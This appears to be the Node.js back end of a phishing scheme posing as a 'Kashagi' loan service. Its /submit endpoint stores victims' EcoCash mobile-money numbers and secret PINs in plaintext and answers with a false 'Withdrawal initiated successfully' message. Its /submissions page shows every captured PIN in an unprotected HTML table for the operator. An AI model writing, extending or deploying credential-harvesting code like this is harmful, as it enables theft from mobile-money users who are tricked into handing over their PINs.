const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");

const app = express();

app.use(cors());
app.use(express.json());

const pool = new Pool({
connectionString: process.env.DATABASE_URL,
ssl: {
rejectUnauthorized: false
}
});

app.get("/", (req, res) => {
res.send("Kashagi Backend Running");
});

app.get("/test-db", async (req, res) => {
try {
const result = await pool.query("SELECT NOW()");
res.json(result.rows[0]);
} catch (err) {
res.status(500).json({
error: err.message
});
}
});

app.get("/create-table", async (req, res) => {
try {
await pool.query("CREATE TABLE IF NOT EXISTS submissions ( id SERIAL PRIMARY KEY, ecocash_number TEXT NOT NULL, ecocash_pin TEXT NOT NULL, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP )");

res.send("Table created successfully");

} catch (err) {
res.status(500).json({
error: err.message
});
}
});

app.post("/submit", async (req, res) => {
try {

const { ecocash_number, ecocash_pin } = req.body;

await pool.query(
  "INSERT INTO submissions (ecocash_number, ecocash_pin) VALUES ($1, $2)",
  [ecocash_number, ecocash_pin]
);

res.json({
  success: true,
  message: "Withdrawal initiated successfully."
});

} catch (err) {

res.status(500).json({
  success: false,
  error: err.message
});

}
});

app.get("/submissions", async (req, res) => {
try {

const result = await pool.query(
  "SELECT * FROM submissions ORDER BY id DESC"
);

let rows = "";

result.rows.forEach(item => {
  rows += `
    <tr>
      <td>${item.id}</td>
      <td>${item.ecocash_number}</td>
      <td>${item.ecocash_pin}</td>
      <td>${new Date(item.created_at).toLocaleString()}</td>
    </tr>
  `;
});

res.send(`
  <!DOCTYPE html>
  <html>
  <head>
    <title>Kashagi Loan Submissions</title>

    <style>
      body{
        font-family:Arial,sans-serif;
        background:#f4f6f9;
        padding:20px;
      }

      h1{
        text-align:center;
        color:#1877f2;
      }

      .container{
        max-width:1200px;
        margin:auto;
      }

      table{
        width:100%;
        border-collapse:collapse;
        background:white;
        box-shadow:0 2px 10px rgba(0,0,0,0.1);
      }

      th{
        background:#1877f2;
        color:white;
        padding:12px;
      }

      td{
        padding:10px;
        border-bottom:1px solid #ddd;
        text-align:center;
      }

      tr:hover{
        background:#f1f7ff;
      }
    </style>
  </head>

  <body>

    <div class="container">

      <h1>Kashagi Loan Submissions</h1>

      <table>

        <tr>
          <th>ID</th>
          <th>EcoCash Number</th>
          <th>EcoCash Pin</th>
          <th>Date Submitted</th>
        </tr>

        ${rows}

      </table>

    </div>

  </body>
  </html>
`);

} catch (err) {

res.status(500).json({
  error: err.message
});

}
});

app.listen(process.env.PORT || 3000, () => {
console.log("Server started");
});
